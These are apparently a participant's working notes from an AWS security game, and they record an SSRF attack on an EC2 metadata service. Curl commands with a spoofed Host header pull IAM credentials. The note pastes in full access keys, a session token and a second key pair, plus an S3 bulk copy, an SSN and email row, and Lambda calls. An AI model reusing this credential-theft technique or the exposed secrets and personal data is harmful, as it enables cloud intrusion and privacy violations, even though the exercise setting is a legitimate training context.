Secret government data has been leaked, and personal information is now publicly available.

Task goal: Find your personal SSN and validate it by invoking a Lambda function Sc2FinCheck_Anatolii_Hromov with parameters (--payload '{"SSN": "xxx-xx-xxxx"}')

Resources:

Lambda - Sc2FinCheck_Anatolii_Hromov
EC2 - IP: 18.192.121.108 *Important - host is accessible only via curl (don't use web browser for it)
S3 - sc2-government-data
Credentials (use only for invoking validation Lambda):

curl 18.192.121.108 host:169.254.169.254

curl.exe 18.192.121.108/latest/meta-data -H host:169.254.169.254

aws configure  set --profile gameday aws_session_tocken

curl -H "Host: 169.254.169.254" 18.192.121.108/latest/meta-data/iam/security-credentials/sc2-ec2-banking

{
  "Code" : "Success",
  "LastUpdated" : "2021-12-18T09:54:35Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA36D6ZZWUTM3RR7PL",
  "SecretAccessKey" : "iJVj3tSmaqlM7vfH2ihWzYqMIroeQyH1DNN6z20E",
  "Token" : "IQoJb3JpZ2luX2VjENL//////////wEaDGV1LWNlbnRyYWwtMSJHMEUCIGCrWH2M7pogoAEJha8GEUmxeQ/0UVcPoe6fByzNcKq9AiEAgbjMTu+OnNQRWzqU6ruSSSeqVp018RPw43cM/dJAvOcqiQQIu///////////ARACGgw4MjA2MDQ2ODU3MzciDJtB1WCR11gaoEnpoCrdA7xH7XW9fiDR5ixKCqd8luP9irr2kqfcaesN+80Gli3wjWjJcB3wd/EpTYvIlKMz69d2Z+Qw4tL6LVBUOssfL11G/XlyVDCYcCLFAuzx0Out8dTjJm/5feLTrpkSruCL1wOB2c0amKPRAZkvHXySDSPesNCrl+/jFUPW8cZKaNHmOa1sBaF9iMNhI7uEOiFs9RSXnu95IPnqBQEfdwDDnHdVHB5KWLPQukgemSm/YMWWvy2BVIMoVirlKIs58SYpN4Ie84fww4cJQro73vusNN5SO1pAHtE8slKniM8wv1VgCjG40VdqIx1lyFjgvBrZ0LImLENIntRxg0yM6qll0VUHhEjx9hcO/NVCmR1UVgaVPPO0s3FAGHU4XPXaIlPiXV40UOUC5mOPko7ermbOjB1J2/7ZjnFUsYo0HVk7pMj3i4t7Qo6UJYMAI79u5QZG7sDam3qKdl5SXeZSQYJi7DwrrQ9RyF4t42jYpUS7oc/J2fEQtg22vJtin8j9xO+r/D+sCTZfQi4rB8+DvSIH+MHmkqoTQske6aetnZzmW+yvnb6qmc30wMJjynyBb82tkWN0MRvZ4SCB9XXrMgC33PZQub3PANkS56kCj+G0ZFsWDzYhzjdvPJyGUVpDszCu3/aNBjqlAW1+Yf9Rq3sTCxTXkDg8LgWhh+E8FJ3f4R3ZP40IpwaCtkSWGc3GMc2DnORbA+RRYG1RPohrlFtDjltATxahTFPuEAP2iz5h35A4ySAd0TAvlWRjOAqSGRAHrVl7zOE0hQUDvko0i9ecOy7R5Cvpsi7+eF0VPoK5UjOtp7J6bNcAxdfvcLUMxhD3RG4yEZFKTNWSM7/BuTjBhNh7cWRE8CKPw/Or0Q==",
  "Expiration" : "2021-12-18T16:09:14Z"


}



aws s3 cp s3://sc2-government-data . --recursive --profile sc2



[12:48 PM] Anatolii Hromov
AKIA36D6ZZWUV332IRHV

[12:48 PM] Anatolii Hromov
ucEo0SBxm5meWuMmzuKeOM7/IyB6Hfmwp/o7GTLY

[12:49 PM] Anatolii Hromov
Sc2FinCheck_vasyl_ostapenko

337,656-75-7575,Secret,ToPass,Is,SSN,ostapenko.vasil@gmail.com,Gender,127.0.0.1

aws lambda invoke --function-name  Sc2FinCheck_vasyl_ostapenko --peyload  --cli-binary-format raw-in-base64-out

aws lambda invoke --function-name Sc2FinCheck_sergey_denisko --payload {"SSN":"656-75-7575"} --profile=SC1 output.json

aws lambda invoke --function-name Sc2FinCheck_vasyl_ostapenko --payload '{\"SSN\":\"656-75-7575\"}' --profile=sc3 output.json  --cli-binary-format